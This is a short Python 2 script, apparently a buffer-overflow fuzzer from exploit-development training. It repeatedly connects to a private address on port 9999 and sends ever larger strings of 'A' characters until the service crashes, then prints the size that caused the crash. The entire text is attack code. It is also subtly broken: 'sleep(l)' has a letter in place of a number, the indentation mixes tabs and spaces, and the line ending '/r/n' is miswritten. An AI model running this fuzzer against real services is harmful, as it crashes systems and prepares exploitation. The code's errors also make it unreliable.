#!/usr/bin/python 
import sys, socket 
from time import sleep 

buffer = " A" * 300

while True: 
		try: 
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
                                s.connect(( '192.168.31.148', 9999)) 
				
				s.send(( '/r/n' + buffer))  
				s.close() 
				sleep(l) 
				buffer = buffer + "A"*100
		except : 
				print "Fuzzing crashed at %s bytes" %str(len(buffer))
				sys.exit()
